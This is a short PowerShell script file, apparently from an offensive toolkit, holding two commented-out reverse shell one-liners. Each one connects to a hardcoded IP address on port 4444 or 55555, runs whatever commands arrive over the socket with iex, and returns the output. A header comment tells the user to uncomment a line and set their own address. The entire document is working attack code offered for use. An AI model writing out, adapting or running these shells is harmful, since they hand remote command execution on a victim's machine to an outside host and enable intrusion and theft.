#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
#$client = New-Object System.Net.Sockets.TCPClient('192.168.254.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$s=([Net.Sockets.TCPClient]::new('192.168.254.1',55555)).GetStream();$b=[byte[]]'0'*65535;$a=[Text.Encoding]::ASCII;while($i=$s.Read($b,0,65535)){$d=$a.GetString($b,0,$i);$t=$a.GetBytes((iex $d 2>&1));$s.write($t,0,$t.length)}

